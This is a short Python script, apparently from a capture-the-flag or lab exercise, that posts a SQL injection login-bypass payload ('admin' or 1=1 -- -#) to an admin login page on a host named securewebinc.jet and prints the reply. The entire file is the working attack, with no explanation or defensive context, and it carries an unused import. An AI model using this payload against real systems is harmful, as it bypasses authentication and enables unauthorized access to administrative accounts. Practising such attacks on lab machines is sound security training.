from flask import redirect
import requests

'''username=admin'+or&password=asd'''

URL = "http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/dologin.php"

PAYLOAD = {
    "username": "admin' or 1=1 -- -#",
    "password": "admin' "
}

r = requests.post(URL, data=PAYLOAD, allow_redirects=True)

print(r.text)